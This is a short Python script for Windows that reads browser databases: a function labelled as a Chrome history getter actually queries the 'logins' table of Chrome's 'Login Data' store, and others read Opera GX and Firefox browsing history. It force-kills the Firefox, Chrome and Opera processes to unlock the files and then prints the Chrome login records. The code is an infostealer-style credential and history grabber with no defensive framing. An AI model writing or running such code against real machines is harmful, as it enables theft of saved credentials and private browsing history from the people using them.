import os
import sqlite3
def chrome_history_getter(uname):
    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
    cursor = con.cursor()
    cursor.execute("SELECT * FROM logins")
    urls = cursor.fetchall()
    return urls
def opera_history_getter(uname):
    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History')
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls
def firefox_history_getter(path):
    con = sqlite3.connect(path)
    cursor = con.cursor()
    cursor.execute("SELECT * FROM moz_places")
    urls = cursor.fetchall()
    return urls
uname = os.getlogin()
os.system("taskkill /im firefox.exe /f")
os.system("taskkill /im chrome.exe /f")
os.system("taskkill /im opera.exe /f")

hist = chrome_history_getter(uname=uname)
hist = str(hist)
print(hist)

